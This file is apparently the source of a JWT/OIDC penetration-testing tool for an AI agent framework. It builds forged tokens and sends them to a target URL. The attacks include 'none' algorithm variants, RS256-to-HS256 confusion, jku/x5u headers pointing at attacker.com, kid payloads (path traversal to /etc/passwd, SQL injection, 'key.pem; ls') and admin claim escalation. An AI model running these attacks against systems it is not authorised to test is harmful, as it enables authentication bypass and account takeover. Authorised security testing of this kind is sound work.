"""
Authentication Tester - JWT/OIDC vulnerability detection.

Complements the authentication_jwt.jinja prompt module with automated testing capabilities.
"""

import base64
import hashlib
import hmac
import json
import time
from typing import Any, Literal

import httpx

from strix.tools.registry import register_tool
from strix.tools.validation import (
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)

AuthAction = Literal[
    "decode_jwt",
    "test_alg_none",
    "test_alg_confusion",
    "test_key_injection",
    "test_claims",
    "test_token_reuse",
    "discover_endpoints",
    "analyze",
    "generate_tokens",
]

VALID_ACTIONS = [
    "decode_jwt",
    "test_alg_none",
    "test_alg_confusion",
    "test_key_injection",
    "test_claims",
    "test_token_reuse",
    "discover_endpoints",
    "analyze",
    "generate_tokens",
]


def _base64url_decode(data: str) -> bytes:
    """Decode base64url without padding."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _base64url_encode(data: bytes) -> str:
    """Encode to base64url without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def _decode_jwt_parts(token: str) -> tuple[dict, dict, str] | None:
    """Decode JWT into header, payload, and signature."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None

        header = json.loads(_base64url_decode(parts[0]))
        payload = json.loads(_base64url_decode(parts[1]))
        signature = parts[2]

        return header, payload, signature
    except Exception:
        return None


def _create_jwt(header: dict, payload: dict, secret: str = "", alg: str = "none") -> str:
    """Create a JWT token with specified algorithm."""
    header_b64 = _base64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _base64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    if alg == "none":
        return f"{header_b64}.{payload_b64}."
    elif alg == "HS256":
        message = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            secret.encode() if isinstance(secret, str) else secret,
            message.encode(),
            hashlib.sha256,
        ).digest()
        sig_b64 = _base64url_encode(signature)
        return f"{header_b64}.{payload_b64}.{sig_b64}"
    else:
        return f"{header_b64}.{payload_b64}."


@register_tool
def auth_tester(
    action: AuthAction,
    url: str | None = None,
    token: str | None = None,
    public_key: str | None = None,
    target_endpoint: str | None = None,
    modified_claims: str | None = None,
    headers: str | None = None,
    timeout: int = 10,
    **kwargs: Any,
) -> dict[str, Any]:
    """
    Test for JWT and authentication vulnerabilities.

    Analyzes JWTs for common vulnerabilities including algorithm confusion,
    none algorithm acceptance, weak secrets, and claim manipulation.

    Args:
        action: The testing action to perform
        url: Base URL of the target application
        token: JWT token to analyze or test
        public_key: RSA public key for algorithm confusion testing
        target_endpoint: API endpoint to test token against
        modified_claims: JSON string of claims to modify
        headers: Additional headers as JSON string
        timeout: Request timeout in seconds

    Returns:
        Dictionary containing test results
    """
    unknown = validate_unknown_params(
        kwargs,
        ["action", "url", "token", "public_key", "target_endpoint",
         "modified_claims", "headers", "timeout"],
    )
    if unknown:
        return {"error": f"Unknown parameters: {unknown}"}

    action_error = validate_action_param(action, VALID_ACTIONS)
    if action_error:
        return action_error

    # Parse additional headers
    extra_headers = {}
    if headers:
        try:
            extra_headers = json.loads(headers)
        except json.JSONDecodeError:
            return {"error": "Invalid JSON format for headers"}

    try:
        if action == "decode_jwt":
            token_error = validate_required_param(token, "token")
            if token_error:
                return token_error
            return _decode_jwt(token)
        elif action == "test_alg_none":
            token_error = validate_required_param(token, "token")
            if token_error:
                return token_error
            url_error = validate_required_param(url, "url")
            if url_error:
                return url_error
            return _test_alg_none(url, token, target_endpoint, extra_headers, timeout)
        elif action == "test_alg_confusion":
            token_error = validate_required_param(token, "token")
            if token_error:
                return token_error
            url_error = validate_required_param(url, "url")
            if url_error:
                return url_error
            return _test_alg_confusion(url, token, public_key, target_endpoint, extra_headers, timeout)
        elif action == "test_key_injection":
            token_error = validate_required_param(token, "token")
            if token_error:
                return token_error
            url_error = validate_required_param(url, "url")
            if url_error:
                return url_error
            return _test_key_injection(url, token, target_endpoint, extra_headers, timeout)
        elif action == "test_claims":
            token_error = validate_required_param(token, "token")
            if token_error:
                return token_error
            url_error = validate_required_param(url, "url")
            if url_error:
                return url_error
            return _test_claims(url, token, target_endpoint, modified_claims, extra_headers, timeout)
        elif action == "test_token_reuse":
            token_error = validate_required_param(token, "token")
            if token_error:
                return token_error
            url_error = validate_required_param(url, "url")
            if url_error:
                return url_error
            return _test_token_reuse(url, token, target_endpoint, extra_headers, timeout)
        elif action == "discover_endpoints":
            url_error = validate_required_param(url, "url")
            if url_error:
                return url_error
            return _discover_endpoints(url, extra_headers, timeout)
        elif action == "analyze":
            token_error = validate_required_param(token, "token")
            if token_error:
                return token_error
            return _analyze_jwt(token)
        elif action == "generate_tokens":
            token_error = validate_required_param(token, "token")
            if token_error:
                return token_error
            return _generate_tokens(token, modified_claims, public_key)
        else:
            return {"error": f"Unknown action: {action}"}
    except httpx.RequestError as e:
        return {"error": f"Request failed: {e!s}"}
    except Exception as e:
        return {"error": f"Test failed: {e!s}"}


def _decode_jwt(token: str) -> dict[str, Any]:
    """Decode and display JWT contents."""
    result = _decode_jwt_parts(token)
    if not result:
        return {"error": "Invalid JWT format"}

    header, payload, signature = result

    return {
        "header": header,
        "payload": payload,
        "signature": signature[:20] + "..." if len(signature) > 20 else signature,
        "algorithm": header.get("alg", "unknown"),
        "token_type": header.get("typ", "unknown"),
    }


def _test_alg_none(
    url: str,
    token: str,
    target_endpoint: str | None,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Test if server accepts 'none' algorithm."""
    result = _decode_jwt_parts(token)
    if not result:
        return {"error": "Invalid JWT format"}

    header, payload, _ = result
    results = {
        "original_algorithm": header.get("alg"),
        "none_variants_tested": [],
        "vulnerable": False,
    }

    endpoint = target_endpoint or "/api/user"
    full_url = f"{url.rstrip('/')}{endpoint}"

    # Test various 'none' variants
    none_variants = ["none", "None", "NONE", "nOnE"]

    with httpx.Client(timeout=timeout) as client:
        for variant in none_variants:
            modified_header = header.copy()
            modified_header["alg"] = variant

            # Create token with no signature
            none_token = _create_jwt(modified_header, payload, alg="none")

            test_headers = headers.copy()
            test_headers["Authorization"] = f"Bearer {none_token}"

            try:
                resp = client.get(full_url, headers=test_headers)

                test_result = {
                    "variant": variant,
                    "status_code": resp.status_code,
                    "accepted": resp.status_code in [200, 201],
                }

                results["none_variants_tested"].append(test_result)

                if test_result["accepted"]:
                    results["vulnerable"] = True
                    results["vulnerable_variant"] = variant
                    results["forged_token"] = none_token

            except Exception as e:
                results["none_variants_tested"].append({
                    "variant": variant,
                    "error": str(e),
                })

    return results


def _test_alg_confusion(
    url: str,
    token: str,
    public_key: str | None,
    target_endpoint: str | None,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Test RS256 to HS256 algorithm confusion attack."""
    result = _decode_jwt_parts(token)
    if not result:
        return {"error": "Invalid JWT format"}

    header, payload, _ = result
    results = {
        "original_algorithm": header.get("alg"),
        "confusion_possible": False,
        "vulnerable": False,
    }

    # Only applicable for RS* algorithms
    original_alg = header.get("alg", "")
    if not original_alg.startswith("RS") and not original_alg.startswith("ES"):
        results["note"] = "Algorithm confusion attack only applies to RS*/ES* algorithms"
        return results

    endpoint = target_endpoint or "/api/user"
    full_url = f"{url.rstrip('/')}{endpoint}"

    results["confusion_possible"] = True

    with httpx.Client(timeout=timeout) as client:
        # If public key provided, attempt confusion attack
        if public_key:
            modified_header = header.copy()
            modified_header["alg"] = "HS256"

            # Use public key as HMAC secret
            confused_token = _create_jwt(modified_header, payload, secret=public_key, alg="HS256")

            test_headers = headers.copy()
            test_headers["Authorization"] = f"Bearer {confused_token}"

            try:
                resp = client.get(full_url, headers=test_headers)

                results["confusion_test"] = {
                    "status_code": resp.status_code,
                    "accepted": resp.status_code in [200, 201],
                }

                if results["confusion_test"]["accepted"]:
                    results["vulnerable"] = True
                    results["forged_token"] = confused_token

            except Exception as e:
                results["confusion_test"] = {"error": str(e)}

        else:
            results["note"] = "Provide public_key parameter to test algorithm confusion"
            results["instructions"] = [
                "1. Obtain the RSA public key from JWKS endpoint",
                "2. Convert to PEM format if needed",
                "3. Provide as public_key parameter",
                "4. Tool will test using public key as HS256 secret",
            ]

    return results


def _test_key_injection(
    url: str,
    token: str,
    target_endpoint: str | None,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Test for key injection via jku, x5u, or jwk header."""
    result = _decode_jwt_parts(token)
    if not result:
        return {"error": "Invalid JWT format"}

    header, payload, _ = result
    results = {
        "original_header": header,
        "injection_vectors": [],
        "vulnerable": False,
    }

    endpoint = target_endpoint or "/api/user"
    full_url = f"{url.rstrip('/')}{endpoint}"

    with httpx.Client(timeout=timeout) as client:
        # Test jku injection
        jku_header = header.copy()
        jku_header["jku"] = "https://attacker.com/.well-known/jwks.json"
        jku_token = _create_jwt(jku_header, payload, alg="none")

        test_headers = headers.copy()
        test_headers["Authorization"] = f"Bearer {jku_token}"

        try:
            resp = client.get(full_url, headers=test_headers)
            results["injection_vectors"].append({
                "type": "jku",
                "status_code": resp.status_code,
                "response_snippet": resp.text[:200] if resp.text else "",
            })
        except Exception as e:
            results["injection_vectors"].append({"type": "jku", "error": str(e)})

        # Test x5u injection
        x5u_header = header.copy()
        x5u_header["x5u"] = "https://attacker.com/cert.pem"
        x5u_token = _create_jwt(x5u_header, payload, alg="none")

        test_headers["Authorization"] = f"Bearer {x5u_token}"

        try:
            resp = client.get(full_url, headers=test_headers)
            results["injection_vectors"].append({
                "type": "x5u",
                "status_code": resp.status_code,
            })
        except Exception as e:
            results["injection_vectors"].append({"type": "x5u", "error": str(e)})

        # Test kid path traversal
        kid_payloads = [
            "../../../../dev/null",
            "../../../etc/passwd",
            "' OR '1'='1",
            "key.pem; ls",
        ]

        for kid_payload in kid_payloads:
            kid_header = header.copy()
            kid_header["kid"] = kid_payload
            kid_token = _create_jwt(kid_header, payload, alg="none")

            test_headers["Authorization"] = f"Bearer {kid_token}"

            try:
                resp = client.get(full_url, headers=test_headers)
                results["injection_vectors"].append({
                    "type": "kid",
                    "payload": kid_payload,
                    "status_code": resp.status_code,
                })

                # Check for path traversal indicators
                if resp.status_code == 500 or "error" in resp.text.lower():
                    results["injection_vectors"][-1]["possible_injection"] = True

            except Exception as e:
                results["injection_vectors"].append({
                    "type": "kid",
                    "payload": kid_payload,
                    "error": str(e),
                })

    return results


def _test_claims(
    url: str,
    token: str,
    target_endpoint: str | None,
    modified_claims: str | None,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Test claim validation and manipulation."""
    result = _decode_jwt_parts(token)
    if not result:
        return {"error": "Invalid JWT format"}

    header, payload, signature = result
    results = {
        "original_claims": payload,
        "claim_tests": [],
        "vulnerable": False,
    }

    endpoint = target_endpoint or "/api/user"
    full_url = f"{url.rstrip('/')}{endpoint}"

    # Claims to test
    claim_modifications = []

    if modified_claims:
        try:
            custom_mods = json.loads(modified_claims)
            claim_modifications.append(("custom", custom_mods))
        except json.JSONDecodeError:
            return {"error": "Invalid JSON format for modified_claims"}
    else:
        # Default claim tests
        if "sub" in payload:
            claim_modifications.append(("sub_manipulation", {"sub": "admin"}))
        if "role" in payload:
            claim_modifications.append(("role_escalation", {"role": "admin"}))
        if "admin" in payload:
            claim_modifications.append(("admin_flag", {"admin": True}))
        if "exp" in payload:
            # Extend expiration
            claim_modifications.append(("exp_extension", {"exp": int(time.time()) + 86400 * 365}))
        if "aud" in payload:
            claim_modifications.append(("aud_removal", {"aud": None}))
        if "iss" in payload:
            claim_modifications.append(("iss_manipulation", {"iss": "https://attacker.com"}))

        # Always test these
        claim_modifications.extend([
            ("add_admin_role", {"role": "admin", "is_admin": True}),
            ("scope_escalation", {"scope": "admin read write delete"}),
        ])

    with httpx.Client(timeout=timeout) as client:
        # Get baseline response
        baseline_headers = headers.copy()
        baseline_headers["Authorization"] = f"Bearer {token}"

        try:
            baseline = client.get(full_url, headers=baseline_headers)
            results["baseline"] = {
                "status_code": baseline.status_code,
                "response_length": len(baseline.text),
            }
        except Exception as e:
            results["baseline"] = {"error": str(e)}

        # Test each claim modification
        for test_name, modifications in claim_modifications:
            modified_payload = payload.copy()

            for key, value in modifications.items():
                if value is None:
                    modified_payload.pop(key, None)
                else:
                    modified_payload[key] = value

            # Create modified token (keeps original signature - tests validation)
            mod_header_b64 = _base64url_encode(json.dumps(header, separators=(",", ":")).encode())
            mod_payload_b64 = _base64url_encode(json.dumps(modified_payload, separators=(",", ":")).encode())
            modified_token = f"{mod_header_b64}.{mod_payload_b64}.{signature}"

            test_headers = headers.copy()
            test_headers["Authorization"] = f"Bearer {modified_token}"

            try:
                resp = client.get(full_url, headers=test_headers)

                test_result = {
                    "test": test_name,
                    "modifications": modifications,
                    "status_code": resp.status_code,
                    "accepted": resp.status_code in [200, 201],
                }

                # Check if response differs from baseline (might indicate claim processing)
                if results.get("baseline", {}).get("response_length"):
                    test_result["response_differs"] = len(resp.text) != results["baseline"]["response_length"]

                results["claim_tests"].append(test_result)

                if test_result["accepted"]:
                    results["vulnerable"] = True

            except Exception as e:
                results["claim_tests"].append({
                    "test": test_name,
                    "error": str(e),
                })

    return results


def _test_token_reuse(
    url: str,
    token: str,
    target_endpoint: str | None,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Test token reuse across different endpoints/services."""
    result = _decode_jwt_parts(token)
    if not result:
        return {"error": "Invalid JWT format"}

    header, payload, _ = result
    results = {
        "token_claims": {
            "iss": payload.get("iss"),
            "aud": payload.get("aud"),
            "azp": payload.get("azp"),
        },
        "reuse_tests": [],
        "cross_service_accepted": False,
    }

    # Endpoints to test token against
    test_endpoints = [
        target_endpoint or "/api/user",
        "/api/admin",
        "/api/internal",
        "/admin",
        "/api/v1/user",
        "/api/v2/user",
        "/graphql",
        "/api/data",
    ]

    with httpx.Client(timeout=timeout) as client:
        test_headers = headers.copy()
        test_headers["Authorization"] = f"Bearer {token}"

        for endpoint in test_endpoints:
            full_url = f"{url.rstrip('/')}{endpoint}"

            try:
                resp = client.get(full_url, headers=test_headers)

                results["reuse_tests"].append({
                    "endpoint": endpoint,
                    "status_code": resp.status_code,
                    "accepted": resp.status_code in [200, 201],
                })

            except Exception as e:
                results["reuse_tests"].append({
                    "endpoint": endpoint,
                    "error": str(e),
                })

        # Count accepted endpoints
        accepted = [t for t in results["reuse_tests"] if t.get("accepted")]
        if len(accepted) > 1:
            results["cross_service_accepted"] = True
            results["note"] = f"Token accepted at {len(accepted)} endpoints - check audience validation"

    return results


def _discover_endpoints(
    url: str,
    headers: dict,
    timeout: int,
) -> dict[str, Any]:
    """Discover authentication-related endpoints."""
    results = {
        "url": url,
        "oidc_config": None,
        "jwks": None,
        "auth_endpoints": [],
    }

    # Well-known endpoints
    wellknown_paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/oauth2/.well-known/openid-configuration",
        "/.well-known/jwks.json",
        "/jwks.json",
        "/oauth/jwks",
        "/.well-known/keys",
    ]

    auth_paths = [
        "/authorize",
        "/oauth/authorize",
        "/oauth2/authorize",
        "/token",
        "/oauth/token",
        "/oauth2/token",
        "/introspect",
        "/revoke",
        "/userinfo",
        "/logout",
        "/login",
        "/api/auth/login",
        "/api/auth/token",
    ]

    with httpx.Client(timeout=timeout, follow_redirects=True) as client:
        # Check OIDC configuration
        for path in wellknown_paths:
            full_url = f"{url.rstrip('/')}{path}"
            try:
                resp = client.get(full_url, headers=headers)

                if resp.status_code == 200:
                    try:
                        data = resp.json()

                        if "jwks_uri" in data or "issuer" in data:
                            results["oidc_config"] = {
                                "path": path,
                                "issuer": data.get("issuer"),
                                "jwks_uri": data.get("jwks_uri"),
                                "authorization_endpoint": data.get("authorization_endpoint"),
                                "token_endpoint": data.get("token_endpoint"),
                                "algorithms_supported": data.get("id_token_signing_alg_values_supported"),
                            }

                        if "keys" in data:
                            results["jwks"] = {
                                "path": path,
                                "key_count": len(data.get("keys", [])),
                                "algorithms": list({k.get("alg") for k in data.get("keys", []) if k.get("alg")}),
                            }

                    except (json.JSONDecodeError, ValueError):
                        pass

            except Exception:
                continue

        # Check auth endpoints
        for path in auth_paths:
            full_url = f"{url.rstrip('/')}{path}"
            try:
                resp = client.get(full_url, headers=headers)

                if resp.status_code not in [404, 500, 502, 503]:
                    results["auth_endpoints"].append({
                        "path": path,
                        "status_code": resp.status_code,
                        "method": "GET",
                    })

            except Exception:
                continue

    return results


def _analyze_jwt(token: str) -> dict[str, Any]:
    """Comprehensive JWT security analysis."""
    result = _decode_jwt_parts(token)
    if not result:
        return {"error": "Invalid JWT format"}

    header, payload, signature = result
    results = {
        "header": header,
        "payload": payload,
        "security_issues": [],
        "recommendations": [],
    }

    # Algorithm analysis
    alg = header.get("alg", "")
    if alg == "none":
        results["security_issues"].append("CRITICAL: Algorithm is 'none' - no signature verification")
    elif alg == "HS256":
        results["security_issues"].append("WARNING: HS256 used - vulnerable to weak secrets")
        results["recommendations"].append("Test for weak/common secrets")
    elif alg.startswith("RS") or alg.startswith("ES"):
        results["recommendations"].append("Test for algorithm confusion (RS256 to HS256)")

    # Header analysis
    if "jku" in header:
        results["security_issues"].append("WARNING: jku header present - test for SSRF/key injection")
    if "x5u" in header:
        results["security_issues"].append("WARNING: x5u header present - test for SSRF/key injection")
    if "jwk" in header:
        results["security_issues"].append("WARNING: jwk header present - test for key injection")
    if "kid" in header:
        results["recommendations"].append("Test kid for path traversal/SQL injection")

    # Claims analysis
    current_time = int(time.time())

    if "exp" in payload:
        exp = payload["exp"]
        if exp < current_time:
            results["security_issues"].append("Token is expired")
        elif exp > current_time + 86400 * 365:
            results["security_issues"].append("WARNING: Very long expiration (>1 year)")
    else:
        results["security_issues"].append("WARNING: No expiration claim - token never expires")

    if "iat" not in payload:
        results["recommendations"].append("No iat claim - cannot verify token age")

    if "aud" not in payload:
        results["security_issues"].append("WARNING: No audience claim - may accept cross-service tokens")

    if "iss" not in payload:
        results["security_issues"].append("WARNING: No issuer claim")

    # Sensitive data check
    sensitive_fields = ["password", "secret", "key", "token", "credit", "ssn"]
    for field in sensitive_fields:
        if any(field in str(k).lower() or field in str(v).lower() for k, v in payload.items()):
            results["security_issues"].append(f"WARNING: Potentially sensitive data in claims: {field}")

    # Test vectors
    results["test_vectors"] = [
        "1. Test 'none' algorithm acceptance",
        "2. Test algorithm confusion (RS256→HS256)",
        "3. Test claim manipulation with same signature",
        "4. Test expired token acceptance",
        "5. Test token reuse across services",
        "6. Test kid injection (path traversal, SQLi)",
    ]

    return results


def _generate_tokens(
    token: str,
    modified_claims: str | None,
    public_key: str | None,
) -> dict[str, Any]:
    """Generate test tokens for various attack scenarios."""
    result = _decode_jwt_parts(token)
    if not result:
        return {"error": "Invalid JWT format"}

    header, payload, _ = result
    results = {
        "original_algorithm": header.get("alg"),
        "generated_tokens": {},
    }

    # Parse custom claim modifications
    custom_mods = {}
    if modified_claims:
        try:
            custom_mods = json.loads(modified_claims)
        except json.JSONDecodeError:
            pass

    # Generate none algorithm token
    none_header = header.copy()
    none_header["alg"] = "none"
    none_payload = payload.copy()
    none_payload.update(custom_mods)
    results["generated_tokens"]["none_algorithm"] = _create_jwt(none_header, none_payload, alg="none")

    # Generate token with extended expiration
    exp_payload = payload.copy()
    exp_payload["exp"] = int(time.time()) + 86400 * 365
    exp_payload.update(custom_mods)
    results["generated_tokens"]["extended_expiration"] = _create_jwt(header, exp_payload, alg="none")

    # Generate admin escalation token
    admin_payload = payload.copy()
    admin_payload["role"] = "admin"
    admin_payload["is_admin"] = True
    admin_payload["admin"] = True
    admin_payload.update(custom_mods)
    results["generated_tokens"]["admin_escalation"] = _create_jwt(header, admin_payload, alg="none")

    # If public key provided, generate confusion attack token
    if public_key:
        hs_header = header.copy()
        hs_header["alg"] = "HS256"
        results["generated_tokens"]["algorithm_confusion"] = _create_jwt(
            hs_header, payload, secret=public_key, alg="HS256"
        )

    results["usage_note"] = "These tokens are unsigned (except algorithm_confusion). Use with proxy interception to test server validation."

    return results
